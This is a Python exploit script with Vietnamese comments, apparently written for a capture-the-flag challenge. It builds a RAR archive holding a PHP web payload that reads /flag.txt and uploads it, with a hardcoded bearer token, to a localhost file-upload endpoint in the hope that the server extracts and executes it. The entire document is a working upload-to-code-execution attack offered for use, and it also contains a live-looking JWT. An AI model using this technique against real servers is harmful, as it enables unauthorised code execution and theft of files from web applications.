import tempfile
import subprocess
import os
import shutil
import requests
import sys

URL = "http://localhost:8000/gateway/transport/"
TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzYwNzc1Njg3LCJpYXQiOjE3NjA3NzUzODcsImp0aSI6ImE3YjlmMzM5OTQ2YTRhZTlhNjc0N2ZhMGZkZjYzNTZhIiwidXNlcl9pZCI6IjE0OTQyYzYyLTRhYzItNGNjNy1hZDMyLWRmYTA2Y2NmZTQ5ZCJ9.U7ZSXi5u0_rVWlvhrfXep3PDoOwMxVMEbaHkjH15rP4"

php_payload = "<?php echo file_get_contents('/flag.txt'); ?>\n"

def find_rar_executable():
    # 1) thử rar trên PATH
    exe = shutil.which("rar")
    if exe:
        return exe
    # 2) thử 7z trên PATH (dùng 7z nếu rar không có)
    exe = shutil.which("7z")
    if exe:
        return exe
    # 3) thử những đường dẫn WinRAR mặc định trên Windows
    possible = [
        r"C:\Program Files\WinRAR\Rar.exe",
        r"C:\Program Files (x86)\WinRAR\Rar.exe",
        r"C:\Program Files\WinRAR\WinRAR.exe",
        r"C:\Program Files (x86)\WinRAR\WinRAR.exe",
    ]
    for p in possible:
        if os.path.exists(p):
            return p
    return None

rar_path = find_rar_executable()
if not rar_path:
    print("Không tìm thấy `rar` hoặc `7z` trên hệ thống.")
    print("Bạn có 2 lựa chọn:")
    print("  1) Cài WinRAR (hoặc 7-Zip). Với Chocolatey: choco install winrar -y  (hoặc choco install 7zip -y).")
    print("  2) Nếu bạn đã cài WinRAR, sửa biến rar_path = r'FULL\\PATH\\TO\\Rar.exe' trong script này.")
    sys.exit(1)

print("Sử dụng chương trình:", rar_path)

with tempfile.TemporaryDirectory() as td:
    target_name = "file.txt"
    target_path = os.path.join(td, target_name)
    with open(target_path, "w", newline="\n") as f:
        f.write(php_payload)

    archive_path = os.path.join(td, "payload.rar")

    # Nếu rar_path là 7z, dùng lệnh 7z; nếu là rar/WinRAR thì dùng lệnh rar
    base = os.path.basename(rar_path).lower()
    try:
        if "7z" in base:
            # 7z a <archive> <file>
            cmd = [rar_path, "a", archive_path, target_path]
        else:
            # rar a -ep1 <archive> <file>
            cmd = [rar_path, "a", "-ep1", archive_path, target_path]
        print("Chạy:", " ".join(cmd))
        subprocess.run(cmd, check=True)
    except subprocess.CalledProcessError as e:
        print("Tạo archive thất bại:", e)
        sys.exit(1)

    with open(archive_path, "rb") as fh:
        files = {"file": ("payload.rar", fh, "application/x-rar-compressed")}
        headers = {"Authorization": f"Bearer {TOKEN}"}
        resp = requests.post(URL, files=files, headers=headers, timeout=30)
        print("Status:", resp.status_code)
        print("Response:", resp.text)
